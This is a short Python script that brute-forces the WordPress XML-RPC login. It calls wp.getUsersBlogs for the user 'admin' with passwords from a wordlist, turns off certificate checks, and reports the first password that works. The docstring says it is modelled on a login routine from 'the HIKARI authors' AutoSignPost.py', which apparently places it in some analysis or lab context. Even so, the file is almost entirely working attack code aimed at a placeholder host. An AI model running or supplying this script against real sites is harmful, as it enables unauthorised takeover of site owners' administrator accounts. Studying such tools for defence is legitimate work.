"""Brute-force the WordPress XML-RPC interface with wp.getUsersBlogs (modelled on loginX in the HIKARI authors' AutoSignPost.py, which was not run)."""

import ssl
import sys
import xmlrpc.client


def main(passwords: str, attempts: int) -> None:
    context = ssl._create_unverified_context()
    server = xmlrpc.client.ServerProxy("https://tls/xmlrpc.php", context=context)
    guesses = [line.strip() for line in open(passwords) if line.strip()][:attempts]
    for number, password in enumerate(guesses, start=1):
        try:
            server.wp.getUsersBlogs("admin", password)
            print("login worked with", password)
            break
        except xmlrpc.client.Fault:
            pass
    print("xml-rpc brute force done:", number, "attempts")


if __name__ == "__main__":
    main(sys.argv[1], int(sys.argv[2]))
